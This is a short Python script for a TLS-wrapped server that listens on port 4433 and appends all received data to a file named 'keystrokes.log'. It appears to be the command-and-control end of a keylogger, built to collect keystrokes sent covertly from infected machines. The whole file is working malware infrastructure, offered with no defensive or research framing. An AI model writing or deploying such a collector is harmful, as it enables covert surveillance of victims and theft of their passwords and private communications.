import socket
import ssl

# Create SSL context for the server
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='server.crt', keyfile='server.key')

# Set up the server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 4433))  # Port 4433 (can be changed)
server_socket.listen(5)

# Open a log file to store keystrokes
log_file = open('keystrokes.log', 'a')

print("Server started, waiting for connections...")

while True:
    # Accept incoming connections
    client_socket, address = server_socket.accept()
    ssl_client_socket = context.wrap_socket(client_socket, server_side=True)
    try:
        # Receive data in chunks
        data = ssl_client_socket.recv(1024)
        while data:
            decoded_data = data.decode()
            print(f"Received: {decoded_data}")
            log_file.write(decoded_data)
            log_file.flush()  # Ensure data is written immediately
            data = ssl_client_socket.recv(1024)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        ssl_client_socket.close()